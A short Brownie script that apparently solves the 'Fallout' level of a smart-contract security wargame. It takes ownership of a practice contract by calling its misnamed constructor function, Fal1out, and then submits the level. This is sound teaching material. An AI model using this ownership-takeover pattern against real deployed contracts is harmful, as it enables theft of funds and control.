from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helper import (
    get_account,
    get_new_instance,
    submit_instance,
)

import web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=2, player=player)
    contract = interface.IFallout(instance_address)

    tx = contract.Fal1out({"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)